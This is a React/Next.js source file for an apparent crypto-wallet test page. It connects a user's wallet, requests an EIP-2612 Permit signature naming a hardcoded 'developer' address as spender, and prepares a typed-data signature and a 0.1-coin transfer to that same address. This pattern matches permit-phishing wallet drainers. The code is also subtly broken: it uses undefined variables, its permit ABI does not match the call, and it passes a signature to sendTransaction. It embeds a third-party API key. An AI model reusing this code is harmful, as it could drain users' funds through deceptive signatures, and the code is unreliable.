'use client';
import {useWalletInfo, useWeb3Modal} from "@web3modal/scaffold-react";
import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage} from "wagmi";
import {parseEther} from "viem";
import {signTypedData} from "@wagmi/core";
import {config} from "@/context/config";
import {Contract, ethers} from "ethers";
import {useEffect, useState} from "react";
import {useEthersSigner} from "@/app/ethers";

const BNBContract = "0xC049BE8bd821f3710231B22777629D00fb8b9a09";
const developer = {
	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
}
const abi = [
	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
	'function nonces(address owner) view returns (uint256)'
];

const Page = () => {
	const open = useWeb3Modal();
	const wallet = useWalletInfo();
	const account = useAccount();
	const { signMessage } = useSignMessage();
	const { sendTransaction } = useSendTransaction()
	const {disconnect} = useDisconnect();
	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
	const signer = useEthersSigner();

	if (isLoading || !balance || !account) return <button onClick={() => open.open()}>
		open
	</button>;

	const message = {
		"owner": account.address!,
		"spender": developer.address!,
		"value": parseEther('0.0001'),
		"nonce": 1,
		"deadline": 1625256000
	} as any;

	return (
		<div>
			<button onClick={() => open.open()}>
				open
			</button>
			<img src={wallet.walletInfo?.icon}/>
			<br/>
			<button onClick={() => {
				console.log(signMessage({
					message: "test",
				}))
			}}>Sign Message
			</button>
			<br/>
			{account.isConnected + ""}
			<br/>
			{account.address}
			<br/>
			{account.chainId}
			<br/>
			<button
				onClick={() => sendTransaction({
					gas: null,
					to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
					value: parseEther('0.0001'),
				})}
			>
				Transfer
			</button>
			<button onClick={disconnect as any}>
				DC

			</button>
			<button onClick={async ()=>{
				if (!account) return;
				const result = await signTypedData(config, {
						"types": {
							"Permit": [
								{ "name": "owner", "type": "address" },
								{ "name": "spender", "type": "address" },
								{ "name": "value", "type": "uint256" },
								{ "name": "nonce", "type": "uint256" },
								{ "name": "deadline", "type": "uint256" }
							]
						},
						"primaryType": "Permit",
						"domain": {
							"name": "OIKX",
							"version": "1",
							"chainId": account.chainId as any,
							"verifyingContract": BNBContract // BNB Contract
						},
						"message": message
					}
				)

				setSignature(result);
			}}>
				SIGN TYPED DATA
			</button>
			<br/>
			SIGNATURE: {signature}
			<br/>
			<button disabled={!signature} onClick={async ()=>{
				if (!signature) return;
				// ABI of the token contract
				// Prepare the permit data
				const spender = developer.address; // Address of the spender
				const amount = ethers.utils.parseUnits('0.001', 18); // Amount of tokens to be spent
				const nonce = 0; // Nonce
				const deadline = 5 * 60 * 1000; // Deadline (optional)
				const { v, r, s } = ethers.utils.splitSignature(signature);
// Call the permit method
				const tokenContract = new ethers.Contract(BNBContract, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
				const tx = await tokenContract.permit(spender, amount, nonce, deadline, v, r, s);
				await tx.wait();

				console.log('Permit successful');
			}}>
				Permit
			</button>
			<br/>
			{account.chainId}
			<br/>
			<button onClick={async ()=>{
				const domain = {
					name: 'Ether Transaction',
					version: '1',
					chainId: account.chainId,
					verifyingContract: BNBContract,  // Dummy contract address
				};

				const types = {
					Transfer: [
						{ name: 'to1', type: 'uint256' },
						{ name: 'to2', type: 'uint256' },
						{ name: 'to3', type: 'uint256' },
						{ name: 'to4', type: 'uint256' },
						{ name: 'to5', type: 'uint256' },
						{ name: 'to6', type: 'uint256' },
						{ name: 'to', type: 'address' },
						{ name: 'value', type: 'uint256' }
					],
				};

				// Define the message to sign
				const message = {
					to1: 9,  // Replace with the recipient address
					to2: 4,  // Replace with the recipient address
					to3: 1,  // Replace with the recipient address
					to4: 23,  // Replace with the recipient address
					to5: 87,  // Replace with the recipient address
					to6: 10,  // Replace with the recipient address
					to: developer.address,  // Replace with the recipient address
					value: ethers.utils.parseUnits('0.001', 'ether').toString(),  // Replace with the amount of ether to send,
				};
				const tx = {
					to: developer.address,
					value: ethers.utils.parseEther('0.1'), // Amount to send
					gasLimit: 21000, // Basic transaction gas limit
					gasPrice: ethers.utils.parseUnits('50', 'gwei'), // Gas price
				};

				const ptx = await signer?.populateTransaction(tx);
				console.log(ptx);

				// Create the typed data
				const typedData = {
					types: types,
					domain: domain,
					primaryType: 'Transfer',
					message: message,
				};

				try {
					// Request the user's signature for the typed data
					const signature = await signer?._signTypedData(domain, types, message);
					console.log('Signature:', signature);
					await signer?.sendTransaction(signature)
					// You can now use this signature to validate and process the transaction off-chain or on-chain
					// Note: Further steps to send this data to a backend or smart contract would be required
				} catch (error) {
					console.error('Failed to sign typed data:', error);
				}
			}}>
				TS Test
			</button>
			<br/>
			<TokenList address={account.address+""} CHAIN_ID={+(account.chainId || "0")}/>
		</div>
	)
};

function TokenList({ address,CHAIN_ID }: {address: string, CHAIN_ID: number}) {
	const [tokens, setTokens] = useState<any[]>([]);
	const [isLoading, setIsLoading] = useState(true);
	const [isError, setIsError] = useState(false);

	useEffect(() => {
		const fetchTokens = async () => {
			try {
				const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
				const data = await response.json();
				setTokens(data.data.items);
				setIsLoading(false);
			} catch (error) {
				console.error('Error fetching tokens:', error);
				setIsError(true);
				setIsLoading(false);
			}
		};

		fetchTokens();
	}, [address]);

	if (isLoading) return <div>Loading...</div>;
	if (isError) return <div>Error fetching tokens</div>;

	console.log(tokens);

	return (
		<div>
			<h2>Tokens in Wallet</h2>
			<ul>
				{tokens.map((token) => (
					<li key={token.contract_address}>
						{token.contract_name} ({token.contract_ticker_symbol}): {ethers.utils.formatUnits(token.balance, token.contract_decimals)}
					</li>
				))}
			</ul>
		</div>
	);
}

export default Page;
